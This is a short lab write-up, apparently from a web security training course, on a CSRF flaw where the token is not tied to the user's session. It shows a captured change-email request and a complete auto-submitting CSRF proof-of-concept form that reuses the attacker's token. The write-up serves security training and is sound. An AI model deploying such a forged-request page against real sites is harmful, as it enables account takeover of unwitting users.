# Lab: CSRF where token is not tied to user session

- There are two sets of credentials.
- There is a functionality for changing email.
- There is a defence mechanism for `CSRF` attack that is using `CSRF` token.

```
POST /my-account/change-email HTTP/1.1
Host: acf71f0c1f4aa2c4c05f0817002f009d.web-security-academy.net
Cookie: session=aIamuschJeB99jIeencml87kMzhBXVXr
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://acf71f0c1f4aa2c4c05f0817002f009d.web-security-academy.net
Referer: https://acf71f0c1f4aa2c4c05f0817002f009d.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

email=test%40test.com&csrf=MAmaJeaqokx2Q3oVLNe7Xjwd5Zhr1U3w
```

- `CSRF` token for `wiener` (attacker) - `ficnp7UUj454tCwZRH0TEeeJGea9Qy22`.
- Login as `carlos` in a private window.
- Generate `CSRF` PoC with `wiener`'s token.

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac001f8f1ff6bcd7c05e27fb0026009a.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="root&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="ficnp7UUj454tCwZRH0TEeeJGea9Qy22" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

- **NOTE** - If `wiener` has already used his token, the attack will fail.